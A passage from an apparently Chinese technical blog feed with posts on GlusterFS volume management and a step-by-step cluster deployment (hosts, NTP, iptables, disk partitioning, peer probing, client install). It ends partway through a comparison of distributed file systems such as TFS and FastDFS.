<h2 id="删除卷"><a href="#删除卷" class="headerlink" title="删除卷"></a>删除卷</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除卷操作，必须先停用卷；</span></span><br><span class="line"><span class="comment"># 最后可清空brick server节点对应目录下的内容</span></span><br><span class="line">gluster volume stop distributed-volume</span><br><span class="line">gluster volume delete distributed-volume</span><br><span class="line">rm -f /brick1/dis_volume</span><br></pre></td></tr></table></figure>

<h2 id="brick管理"><a href="#brick管理" class="headerlink" title="brick管理"></a>brick管理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加brick</span></span><br><span class="line">gluster volume add-brick VOLNAME NEW-BRICK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除brick</span></span><br><span class="line">gluster volume remove-brick VOLNAME BRICK [start | status | commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换brick</span></span><br><span class="line">gluster volume replace-brick VOLNAME BRICKNEW-BRICK [start | pause | sbortstatus | commit]</span><br></pre></td></tr></table></figure>

<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>相关日志，在/var/log/glusterfs/目录下，可根据需要查看；</p>
<p>如/var/log/glusterfs/brick/下是各brick创建的日志；</p>
<p>如/var/log/glusterfs/cmd_history.log是命令执行记录日志；</p>
<p>如/var/log/glusterfs/glusterd.log是glusterd守护进程日志。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>GlusterFS</tag>
      </tags>
  </entry>
  <entry>
    <title>GlusterFS分布式存储集群之部署</title>
    <url>/articles/e3bb873c.html</url>
    <content><![CDATA[<h1 id="Glusterfs框架"><a href="#Glusterfs框架" class="headerlink" title="Glusterfs框架"></a>Glusterfs框架</h1><p>Glusterfs（Gluster file system）是开源的，具有强大横向扩展能力的（scale-out）,分布式的，可将来自多个服务器的存储资源通过tcp/ip或infiniBand RDMA 网络整合到一个统一的全局命名空间中的文件系统。</p>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p><img src="/articles/e3bb873c/1.png" alt="img"></p>
<ol>
<li>GlusterFS主要由存储服务器（Brick Server）、客户端以及 NFS/Samba 存储网关组成；</li>
<li>架构中无元数据服务器组件，无对于提升整个系统的性单点故障和性能瓶颈问题，可提高系统扩展性、性能、可靠性和稳定性；</li>
<li>GlusterFS支持 TCP/IP 和 InfiniBand RDMA 高速网络互联；</li>
<li>客户端可通过原生 GlusterFS 协议访问数据，其他没有运行 GlusterFS 客户端的终端可通过 NFS/CIFS 标准协议通过存储网关访问数据（存储网关提供弹性卷管理和访问代理功能）；</li>
<li>存储服务器主要提供基本的数据存储功能，客户端弥补了没有元数据服务器的问题，承担了更多的功能，包括数据卷管理、I/O 调度、文件定位、数据缓存等功能，利用 FUSE（File system in User Space）模块将 GlusterFS 挂载到本地文件系统之上，实现 POSIX 兼容的方式来访问系统数据。</li>
</ol>
<h2 id="常见术语"><a href="#常见术语" class="headerlink" title="常见术语"></a>常见术语</h2><ol>
<li>Brick：GlusterFS中最基本的存储单元，表示为受信存储池（trusted storage pool）中输出的目录，供客户端挂载用，可以通过主机名与目录名来标识，如’SERVER:EXPORT’；</li>
<li>Volume：卷，逻辑上由N个brick组成；</li>
<li>FUSE：Unix-like OS上的可动态加载的模块，允许用户不用修改内核即可创建自己的文件系统；</li>
<li>Glusterd：Gluster management daemon，在trusted storage pool中所有的服务器上运行；</li>
<li>Volfile：Glusterfs进程的配置文件，通常是位于/var/lib/glusterd/vols/目录下的{volname}文件；</li>
<li>Self-heal：用于后台运行检测复本卷中文件与目录的不一致性并解决这些不一致；</li>
<li>Split-brain：脑裂；</li>
<li>GFID：GlusterFS卷中的每个文件或目录都有一个唯一的128位的数据相关联，用于模拟inode；</li>
<li>Namespace：每个Gluster卷都导出单个ns作为POSIX的挂载点。</li>
</ol>
<h2 id="数据访问流程"><a href="#数据访问流程" class="headerlink" title="数据访问流程"></a>数据访问流程</h2><p><img src="/articles/e3bb873c/2.png" alt="img"></p>
<ol>
<li>在客户端,用户通过 glusterfs的mount point读写数据；</li>
<li>用户的这个操作被递交给本地 Linux 系统的VFS 来处理；</li>
<li>VFS 将数据递交给 FUSE 内核文件系统（在启动 glusterfs 客户端以前,需要向系统注册一个实际的文件系统 FUSE），该文件系统与 ext3 在同一个层次， ext3 是对实际的磁盘进行处理，而 fuse 文件系统则是将数据通过 /dev/fuse 这个设备文件递交给了glusterfs client 端，可以将 fuse 文件系统理解为一个代理；</li>
<li>数据被 fuse 递交给 Glusterfs client 后， client 对数据进行一些指定的处理（即按 client 配置文件来进行的一系列处理）；</li>
<li>在 glusterfs client 的处理末端,通过网络将数据递交给 Glusterfs Server, 并且将数据写入到服务器所控制的存储设备上。</li>
</ol>
<a id="more"></a>

<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol>
<li><p>Quick Start Guide：<a href="http://gluster.readthedocs.io/en/latest/Quick-Start-Guide/Quickstart/" target="_blank" rel="noopener">http://gluster.readthedocs.io/en/latest/Quick-Start-Guide/Quickstart/</a></p>
</li>
<li><p>Install-Guide：<a href="https://docs.gluster.org/en/latest/Install-Guide/Install/" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Install-Guide/Install/</a></p>
</li>
<li><p>CentOS gluster-Quickstart：<a href="https://wiki.centos.org/SpecialInterestGroup/Storage/gluster-Quickstart" target="_blank" rel="noopener">https://wiki.centos.org/SpecialInterestGroup/Storage/gluster-Quickstart</a></p>
</li>
<li><p>Type of Volumes：<a href="https://docs.gluster.org/en/latest/Quick-Start-Guide/Architecture/#types-of-volumes" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Quick-Start-Guide/Architecture/#types-of-volumes</a></p>
</li>
<li><p>Setting up GlusterFS Volumes：[<a href="https://docs.gluster.org/en/latest/Administrator%20Guide/Setting%20Up%20Volumes/]" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Administrator%20Guide/Setting%20Up%20Volumes/]</a>(<a href="https://docs.gluster.org/en/latest/Administrator" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Administrator</a> Guide/Setting Up Volumes/)</p>
</li>
<li><p>脑裂：[<a href="https://docs.gluster.org/en/latest/Administrator%20Guide/Split%20brain%20and%20ways%20to%20deal%20with%20it/]" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Administrator%20Guide/Split%20brain%20and%20ways%20to%20deal%20with%20it/]</a>(<a href="https://docs.gluster.org/en/latest/Administrator" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Administrator</a> Guide/Split brain and ways to deal with it/)</p>
</li>
<li><p>Glusterfs技术详解（推荐）：<a href="https://czero000.github.io/2016/04/05/glusterfs-technical-explanation.html" target="_blank" rel="noopener">https://czero000.github.io/2016/04/05/glusterfs-technical-explanation.html</a></p>
</li>
</ol>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="环境规划"><a href="#环境规划" class="headerlink" title="环境规划"></a>环境规划</h2><table>
<thead>
<tr>
<th><strong>Hostname</strong></th>
<th><strong>IP</strong></th>
<th><strong>Service</strong></th>
<th><strong>Remark</strong></th>
</tr>
</thead>
<tbody><tr>
<td>glusterfs-client</td>
<td>172.30.200.50</td>
<td>glusterfs(3.12.9)glusterfs-fuse</td>
<td>客户端</td>
</tr>
<tr>
<td>glusterfs01</td>
<td>172.30.200.51</td>
<td>glusterfs(3.12.9)glusterfs-server(3.12.9)glusterfs-fuse</td>
<td>服务器端</td>
</tr>
<tr>
<td>glusterfs02</td>
<td>172.30.200.52</td>
<td>glusterfs(3.12.9)glusterfs-server(3.12.9)glusterfs-fuse</td>
<td>服务器端</td>
</tr>
<tr>
<td>glusterfs03</td>
<td>172.30.200.53</td>
<td>glusterfs(3.12.9)glusterfs-server(3.12.9)glusterfs-fuse</td>
<td>服务器端</td>
</tr>
<tr>
<td>glusterfs04</td>
<td>172.30.200.54</td>
<td>glusterfs(3.12.9)glusterfs-server(3.12.9)glusterfs-fuse</td>
<td>服务器端</td>
</tr>
</tbody></table>
<h2 id="设置hosts"><a href="#设置hosts" class="headerlink" title="设置hosts"></a>设置hosts</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 所有节点保持一致的hosts即可，以gluster01节点为例；</span></span><br><span class="line"><span class="comment"># 绑定hosts不是必须的，后续组建受信存储池也可使用ip的形式</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># vim /etc/hosts </span></span><br><span class="line"><span class="comment"># glusterfs</span></span><br><span class="line">172.30.200.50   glusterfs-client</span><br><span class="line">172.30.200.51   glusterfs01</span><br><span class="line">172.30.200.52   glusterfs02</span><br><span class="line">172.30.200.53   glusterfs03</span><br><span class="line">172.30.200.54   glusterfs04</span><br><span class="line"></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># cat /etc/hosts</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/3.png" alt="img"></p>
<h2 id="设置ntp"><a href="#设置ntp" class="headerlink" title="设置ntp"></a>设置ntp</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 至少4个Brick Server节点需要保持时钟同步（重要），以glusterfs01节点为例</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># yum install chrony -y </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑/etc/chrony.conf文件，设置”172.20.0.252”为时钟源；</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># egrep -v "^$|^#" /etc/chrony.conf </span></span><br><span class="line">server 172.20.0.252 iburst</span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line">makestep 1.0 3</span><br><span class="line">rtcsync</span><br><span class="line">logdir /var/<span class="built_in">log</span>/chrony</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置开机启动，并重启</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># systemctl enable chronyd.service</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># systemctl restart chronyd.service</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># systemctl status chronyd.service</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># chronyc sources -v</span></span><br></pre></td></tr></table></figure>

<h2 id="设置glusterfs-packages"><a href="#设置glusterfs-packages" class="headerlink" title="设置glusterfs packages"></a>设置glusterfs packages</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全部节点安装glusterfs yum源</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># yum install -y centos-release-gluster </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># yum repolist</span></span><br></pre></td></tr></table></figure>

<h2 id="设置iptables"><a href="#设置iptables" class="headerlink" title="设置iptables"></a>设置iptables</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提前统一设置iptables（至少4个Brick Server节点），以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 初始环境已使用iptables替代centos7.x自带的firewalld，同时关闭selinux；</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># vim /etc/sysconfig/iptables</span></span><br><span class="line"><span class="comment"># tcp24007:24008：glusterfsd daemon management服务监听端口；</span></span><br><span class="line"><span class="comment"># tcp49152:49160：3.4版本之后（之前的版本的起始端口是24009），启动1个brick，即启动1个监听端口，起始端口为49152，依次类推，如这里设置49152:49160，可开启9个brick；</span></span><br><span class="line"><span class="comment"># 另如果启动nfs server，需要开启38465:38467，111等端口</span></span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 24007:24008 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 49152:49160 -j ACCEPT</span><br><span class="line"></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># service iptables restart</span></span><br></pre></td></tr></table></figure>

<h1 id="设置glusterfs"><a href="#设置glusterfs" class="headerlink" title="设置glusterfs"></a>设置glusterfs</h1><h2 id="mount-brick"><a href="#mount-brick" class="headerlink" title="mount brick"></a>mount brick</h2><h4 id="创建分区"><a href="#创建分区" class="headerlink" title="创建分区"></a>创建分区</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 各brick server的磁盘挂载前需要创建分区并格式化，以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 将整个/dev/sdb磁盘设置为1个分区，分区设置默认即可</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># fdisk /dev/sdb</span></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Select (default p): </span><br><span class="line">Partition number (1-4, default 1): </span><br><span class="line">First sector (2048-209715199, default 2048): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-209715199, default 209715199): </span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># fdisk -l /dev/sdb</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/4.png" alt="img"></p>
<h4 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs01 ~]<span class="comment"># mkfs.xfs -i size=512 /dev/sdb1</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/5.png" alt="img"></p>
<h4 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建挂载目录，目录名自定义；</span></span><br><span class="line"><span class="comment"># 这里为区分，可以将4个server节点的目录名按顺序命名（非必须）</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># mkdir -p /brick1</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># mkdir -p /brick2</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># mkdir -p /brick3</span></span><br><span class="line">[root@glusterfs04 ~]<span class="comment"># mkdir -p /brick4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改/etc/fstab文件，以glusterfs01节点为例，注意其余3各节点挂载点目录名不同；</span></span><br><span class="line"><span class="comment"># 第一栏：设备装置名；</span></span><br><span class="line"><span class="comment"># 第二栏：挂载点；</span></span><br><span class="line"><span class="comment"># 第三栏：文件系统；</span></span><br><span class="line"><span class="comment"># 第四栏：文件系统参数，默认情况使用 defaults 即可，同时具有 rw, suid, dev, exec, auto, nouser, async 等参数；</span></span><br><span class="line"><span class="comment"># 第五栏：是否被 dump 备份命令作用，"0"代表不做 dump 备份； "1"代表要每天进行 dump； "2"代表其他不定日期的 dump； 通常设置"0" 或者"1"；</span></span><br><span class="line"><span class="comment"># 第六栏：是否以 fsck 检验扇区，启动过程中，系统默认会以 fsck 检验 filesystem 是否完整 (clean)， 但某些 filesystem 是不需要检验的，如swap；"0"是不要检验，"1"表示最早检验(一般只有根目录会配置为 "1")，"2"是检验，但晚于"1"；通常根目录配置为"1" ，其余需要要检验的 filesystem 都配置为"2"；</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># echo "/dev/sdb1 /brick1                               xfs     defaults        1 2" &gt;&gt; /etc/fstab</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载并展示</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># mount -a &amp;&amp; mount</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/6.png" alt="img"></p>
<h2 id="启动glusterfs-server"><a href="#启动glusterfs-server" class="headerlink" title="启动glusterfs-server"></a>启动glusterfs-server</h2><h4 id="安装glusterfs-server"><a href="#安装glusterfs-server" class="headerlink" title="安装glusterfs-server"></a>安装glusterfs-server</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在4个brick server节点安装glusterfs-server，以glusterfs01节点为例</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># yum install -y glusterfs-server</span></span><br></pre></td></tr></table></figure>

<h4 id="启动glusterfs-server-1"><a href="#启动glusterfs-server-1" class="headerlink" title="启动glusterfs-server"></a>启动glusterfs-server</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs01 ~]<span class="comment"># systemctl enable glusterd</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># systemctl restart glusterd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># systemctl status glusterd</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/7.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看服务监听端口</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># netstat -tunlp</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/8.png" alt="img"></p>
<h2 id="组建受信存储池"><a href="#组建受信存储池" class="headerlink" title="组建受信存储池"></a>组建受信存储池</h2><p>受信存储池（trusted storage pools），是1个可信的网络存储服务器，为卷提供brick，可以理解为集群。 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在任意一个server节点组建受信存储池均可，即由任意节点邀请其他节点组建存储池；</span></span><br><span class="line"><span class="comment"># 组建时，做为”邀请者”，不需要再加入本节点；</span></span><br><span class="line"><span class="comment"># 使用ip或dns主机名解析都可以，这里已在hosts文件绑定主机，采用主机名；</span></span><br><span class="line"><span class="comment"># 从集群移除节点：gluster peer detach &lt;ip or hostname&gt;</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster peer probe glusterfs02</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster peer probe glusterfs03</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster peer probe glusterfs04</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/9.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看受信存储池状态；</span></span><br><span class="line"><span class="comment"># 在glusterfs01节点查看集群状态，不会list出本节点，只展示peers</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster peer status</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/e3bb873c/10.png" alt="img"></p>
<h2 id="设置glusterfs-client"><a href="#设置glusterfs-client" class="headerlink" title="设置glusterfs-client"></a>设置glusterfs-client</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 客户端主要安装两个组件，glusterfs与glusterfs-fuse；</span></span><br><span class="line"><span class="comment"># glusterfs-client具备如数据卷管理、I/O 调度、文件定位、数据缓存等功能；</span></span><br><span class="line"><span class="comment"># glusterfs-fuse将远端glusterfs挂载到本地文件系统，可通过”modinfo fuse”，“ll /dev/fuse”等命令查看</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># yum install -y glusterfs glusterfs-fuse</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>GlusterFS</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式存储的优劣对比</title>
    <url>/articles/455d7de6.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文通过对比当前主流的几种分布式存储方案（Ceph,TFS,FastDFS,MogileFS,MooseFS,GlusterFS等），让你知道他们的优缺点，便于你根据使用场景选择合适的方案。</p>
<h2 id="系统整体对比"><a href="#系统整体对比" class="headerlink" title="系统整体对比"></a>系统整体对比</h2><table>
<thead>
<tr>
<th>对比说明/文件系统</th>
<th>TFS</th>
<th>FastDFS</th>
<th>MogileFS</th>
<th>MooseFS</th>
<th>GlusterFS</th>
<th>Ceph</th>
</tr>
</thead>
<tbody><tr>
<td>开发语言</td>
<td>C++</td>
<td>C</td>
<td>Perl</td>
<td>C</td>
<td>C</td>
<td>C++</td>
</tr>
<tr>
<td>开源协议</td>
<td>GPL V2</td>
<td>GPL V3</td>
<td>GPL</td>
<td>GPL V3</td>
<td>GPL V3</td>
<td>LGPL</td>
</tr>
<tr>
<td>数据存储方式</td>
<td>块</td>
<td>文件/Trunk</td>
<td>文件</td>
<td>块</td>
<td>文件/块</td>
<td>对象/文件/块</td>
</tr>
<tr>
<td>集群节点通信协议</td>
<td>私有协议（TCP）</td>
<td>私有协议（TCP）</td>
<td>HTTP</td>
<td>私有协议（TCP）</td>
<td>私有协议（TCP）/ RDAM(远程直接访问内存)</td>
<td>私有协议（TCP）</td>
</tr>
<tr>
<td>专用元数据存储点</td>
<td>占用NS</td>
<td>无</td>
<td>占用DB</td>
<td>占用MFS</td>
<td>无</td>
<td>占用MDS</td>
</tr>
<tr>
<td>在线扩容</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>冗余备份</td>
<td>支持</td>
<td>支持</td>
<td>-</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>单点故障</td>
<td>存在</td>
<td>不存在</td>
<td>存在</td>
<td>存在</td>
<td>不存在</td>
<td>存在</td>
</tr>
<tr>
<td>跨集群同步</td>
<td>支持</td>
<td>部分支持</td>
<td>-</td>
<td>-</td>
<td>支持</td>
<td>不适用</td>
</tr>
<tr>
<td>易用性</td>
<td>安装复杂，官方文档少</td>
<td>安装简单，社区相对活跃</td>
<td>-</td>
<td>安装简单，官方文档多</td>
<td>安装简单，官方文档专业化</td>
<td>安装简单，官方文档专业化</td>
</tr>
<tr>
<td>适用场景</td>
<td>跨集群的小文件</td>
<td>单集群的中小文件</td>
<td>-</td>
<td>单集群的大中文件</td>
<td>跨集群云存储</td>
<td>单集群的大中小文件</td>
</tr>
</tbody></table>
<p>开源协议说明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPL:不允许修改后和衍生的代码做为闭源的商业软件发布和销售，修改后该软件产品必须也采用GPL协议；</span><br><span class="line">GPL V2：修改文本的整体就必须按照GPL流通，不仅该修改文本的源码必须向社 会公开，而且对于这种修改文本的流通不准许附加修改者自己作出的限制;</span><br><span class="line">GPL V3：要求用户公布修改的源代码，还要求公布相关硬件;LGPL：更宽松的GPL</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="TFS"><a href="#TFS" class="headerlink" title="TFS"></a>TFS</h2><p>TFS（Taobao File System）是由淘宝开发的一个分布式文件系统，其内部经过特殊的优化处理，适用于海量的小文件存储，目前已经对外开源；</p>
<p>TFS采用自有的文件系统格式存储，因此需要专用的API接口去访问，目前官方提供的客户端版本有：C++/JAVA/PHP。</p>
<p><img src="/articles/455d7de6/1.png" alt="img"></p>
<ul>
<li>特性</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）在TFS文件系统中，NameServer负责管理文件元数据，通过HA机制实现主备热切换，由于所有元数据都是在内存中，其处理效率非常高效，系统架构也非常简单，管理也很方便；</span><br><span class="line">2）TFS的DataServer作为分部署数据存储节点，同时也具备负载均衡和冗余备份的功能，由于采用自有的文件系统，对小文件会采取合并策略，减少数据碎片，从而提升IO性能；</span><br><span class="line">3）TFS将元数据信息（BlockID、FileID）直接映射至文件名中，这一设计大大降低了存储元数据的内存空间；</span><br></pre></td></tr></table></figure>

<ul>
<li>优点</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）针对小文件量身定做，随机IO性能比较高；</span><br><span class="line">2）支持在线扩容机制，增强系统的可扩展性；</span><br><span class="line">3）实现了软RAID，增强系统的并发处理能力及数据容错恢复能力；</span><br><span class="line">4）支持主备热倒换，提升系统的可用性；</span><br><span class="line">5）支持主从集群部署，其中从集群主要提供读/备功能；</span><br></pre></td></tr></table></figure>

<ul>
<li>缺点</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）TFS只对小文件做优化，不适合大文件的存储；</span><br><span class="line">2）不支持POSIX通用接口访问，通用性较低；</span><br><span class="line">3）不支持自定义目录结构，及文件权限控制；</span><br><span class="line">4）通过API下载，存在单点的性能瓶颈；</span><br><span class="line">5）官方文档非常少，学习成本高；</span><br></pre></td></tr></table></figure>

<ul>
<li>应用场景</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）多集群部署的应用</span><br><span class="line">2）存储后基本不做改动</span><br><span class="line">3）海量小型文件</span><br><span class="line">根据目前官方提供的材料，对单个集群节点，存储节点在1000台以内可以良好工作，如存储节点扩大可能会出现NameServer的性能瓶颈，目前淘宝线上部署容量已达到1800TB规模（2009年数据）</span><br></pre></td></tr></table></figure>

<ul>
<li><p>安装及使用</p>
</li>
<li><p><a href="http://blog.csdn.net/junefsh/article/details/43987811" target="_blank" rel="noopener">安装指导</a></p>
</li>
<li><p><a href="http://blog.csdn.net/junefsh/article/details/43987829" target="_blank" rel="noopener">TFS_配置使用</a></p>
</li>
</ul>
<p> <strong>源代码路径</strong>：<a href="http://code.taobao.org/p/tfs/src/" target="_blank" rel="noopener">http://code.taobao.org/p/tfs/src/</a></p>
<p> <strong>参考</strong></p>
<p> <strong><a href="http://rdc.taobao.com/blog/cs/?p=128" target="_blank" rel="noopener">http://rdc.taobao.com/blog/cs/?p=128</a></strong></p>
<p> <strong><a href="http://elf8848.iteye.com/blog/1724423" target="_blank" rel="noopener">http://elf8848.iteye.com/blog/1724423</a></strong></p>
<p> <strong><a href="http://baike.baidu.com/view/1030880.htm" target="_blank" rel="noopener">http://baike.baidu.com/view/1030880.htm</a></strong></p>
<p> <strong><a href="http://blog.yunnotes.net/index.php/install_document_for_tfs/" target="_blank" rel="noopener">http://blog.yunnotes.net/index.php/install_document_for_tfs/</a></strong></p>
<h2 id="FastDFS"><a href="#FastDFS" class="headerlink" title="FastDFS"></a><strong>FastDFS</strong></h2><p><img src="/articles/455d7de6/2.png" alt="img"></p>
<p>FastDFS是国人开发的一款分布式文件系统，目前社区比较活跃。如上图所示系统中存在三种节点：Client、Tracker、Storage，在底层存储上通过逻辑的分组概念，使得通过在同组内配置多个Storage，从而实现软RAID10,提升并发IO的性能、简单负载均衡及数据的冗余备份；同时通过线性的添加新的逻辑存储组，从容实现存储容量的线性扩容。</p>
<p>文件下载上，除了支持通过API方式，目前还提供了apache和nginx的插件支持，同时也可以不使用对应的插件，直接以Web静态资源方式对外提供下载。</p>
<p>目前FastDFS(V4.x)代码量大概6w多行，内部的网络模型使用比较成熟的libevent三方库，具备高并发的处理能力。</p>
<ul>
<li><strong>特性</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）在上述介绍中Tracker服务器是整个系统的核心枢纽，其完成了访问调度（负载均衡），监控管理Storage服务器，由此可见Tracker的作用至关重要，也就增加了系统的单点故障，为此FastDFS支持多个备用的Tracker，虽然实际测试发现备用Tracker运行不是非常完美，但还是能保证系统可用。</span><br><span class="line">2）在文件同步上，只有同组的Storage才做同步，由文件所在的源Storage服务器push至其它Storage服务器，目前同步是采用Binlog方式实现，由于目前底层对同步后的文件不做正确性校验，因此这种同步方式仅适用单个集群点的局部内部网络，如果在公网上使用，肯定会出现损坏文件的情况，需要自行添加文件校验机制。</span><br><span class="line">3）支持主从文件，非常适合存在关联关系的图片，在存储方式上，FastDFS在主从文件ID上做取巧，完成了关联关系的存储。</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>优点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）系统无需支持POSIX(可移植操作系统)，降低了系统的复杂度，处理效率更高</span><br><span class="line">2）支持在线扩容机制，增强系统的可扩展性</span><br><span class="line">3）实现了软RAID，增强系统的并发处理能力及数据容错恢复能力</span><br><span class="line">4）支持主从文件，支持自定义扩展名</span><br><span class="line">5）主备Tracker服务，增强系统的可用性</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>缺点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）不支持断点续传，对大文件将是噩梦（FastDFS不适合大文件存储）</span><br><span class="line">2）不支持POSIX通用接口访问，通用性较低</span><br><span class="line">3）对跨公网的文件同步，存在较大延迟，需要应用做相应的容错策略</span><br><span class="line">4）同步机制不支持文件正确性校验，降低了系统的可用性</span><br><span class="line">5）通过API下载，存在单点的性能瓶颈</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>应用场景</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）单集群部署的应用</span><br><span class="line">2）存储后基本不做改动</span><br><span class="line">3）小中型文件根据</span><br><span class="line">目前官方提供的材料，现有的使用FastDFS系统存储容量已经达到900T，物理机器已经达到100台（50个组）</span><br></pre></td></tr></table></figure>

<p> <a href="http://blog.csdn.net/junefsh/article/details/43987863" target="_blank" rel="noopener">安装指导_FastDFS</a></p>
<p> <strong>源码路径：</strong><a href="https://github.com/happyfish100/fastdfs" target="_blank" rel="noopener">https://github.com/happyfish100/fastdfs</a></p>
<ul>
<li><p><strong>参考</strong></p>
<p><a href="https://code.google.com/p/fastdfs/" target="_blank" rel="noopener">https://code.google.com/p/fastdfs/</a> </p>
<p><a href="http://bbs.chinaunix.net/forum-240-1.html" target="_blank" rel="noopener">http://bbs.chinaunix.net/forum-240-1.html</a></p>
